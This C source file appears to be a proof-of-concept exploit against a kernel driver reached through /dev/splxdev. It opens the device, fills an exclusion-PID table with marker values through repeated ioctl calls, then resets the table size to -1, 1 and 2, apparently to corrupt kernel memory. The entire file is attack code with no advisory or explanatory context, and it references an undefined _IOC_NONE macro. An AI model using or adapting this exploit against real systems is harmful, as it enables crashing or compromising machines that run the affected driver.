#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <fcntl.h>

typedef int Boolean;

typedef struct
{
    Boolean incoming;
    Boolean outgoing;
    Boolean running;
    char    *dirs;
    char    *exts;
    char    *exc_dirs;
    char    *exc_fils;
    char    *exc_exts;
    int debug_level;
    int max_cache_item;
    int max_list_item;
    int max_dir_item;
    int max_ext_item;
    int max_exc_dir_item;
    int max_exc_fil_item;
    int max_exc_ext_item;
    int waitq_timeout;
    int vsapi_timeout;
    int max_exc_pid;
    int max_vsc_pid;
    int max_path_len;
    int max_cmd_len;
} INIT_ARGS;

#define _IOC_WRITE     1U
#define _IOC_READ      2U
#define _IOC_NRBITS     8
#define _IOC_TYPEBITS   8

#define _IOC_SIZEBITS  14

#define _IOC_DIRBITS   2

#define _IOC_NRMASK     ((1 << _IOC_NRBITS)-1)
#define _IOC_TYPEMASK   ((1 << _IOC_TYPEBITS)-1)
#define _IOC_SIZEMASK   ((1 << _IOC_SIZEBITS)-1)
#define _IOC_DIRMASK    ((1 << _IOC_DIRBITS)-1)

#define _IOC_NRSHIFT    0
#define _IOC_TYPESHIFT  (_IOC_NRSHIFT+_IOC_NRBITS)
#define _IOC_SIZESHIFT  (_IOC_TYPESHIFT+_IOC_TYPEBITS)
#define _IOC_DIRSHIFT   (_IOC_SIZESHIFT+_IOC_SIZEBITS)

#define _IOC(dir,type,nr,size) \
        (((dir)  << _IOC_DIRSHIFT) | \
         ((type) << _IOC_TYPESHIFT) | \
         ((nr)   << _IOC_NRSHIFT) | \
         ((size) << _IOC_SIZESHIFT))

#define _IOC_TYPECHECK(t) (sizeof(t))

#define     MAGIC       'S'
#define _IOW(type,nr,size)      _IOC(_IOC_WRITE,(type),(nr),(_IOC_TYPECHECK(size)))
#define _IO(type,nr)            _IOC(_IOC_NONE,(type),(nr),0)


#define     SIOCSETINIFIL   _IOW(MAGIC, 0, INIT_ARGS)
#define     SIOCPUTEXCPID   _IOW(MAGIC, 2, int)


int main() {
	int fd;
	INIT_ARGS args;
	int i;
	int rv;
	int num = 10000;

	fd = open("/dev/splxdev",O_RDWR);
	if (fd == -1) {
		perror("open");
		return -1;
	}

	memset(&args,0,sizeof(args));

	args.max_exc_pid = num;
	rv = ioctl(fd, SIOCSETINIFIL, &args);
	if (rv==-1) {
		perror("ioctl");
		return -1;
	}

	for (i = 0;i < num; i++) {
		int pid=0x414200+i;
		ioctl(fd,SIOCPUTEXCPID,&pid);
	}

	args.max_exc_pid = -1;
	rv = ioctl(fd, SIOCSETINIFIL, &args);
	if (rv == -1) {
		perror("ioctl2");
		return -1;
	}

	args.max_exc_pid = 1;
	rv = ioctl(fd, SIOCSETINIFIL, &args);
	if (rv == -1) {
		perror("ioctl3\n");
		return -1;
	}

	args.max_exc_pid = 2;
   	rv = ioctl(fd, SIOCSETINIFIL, &args);

}	

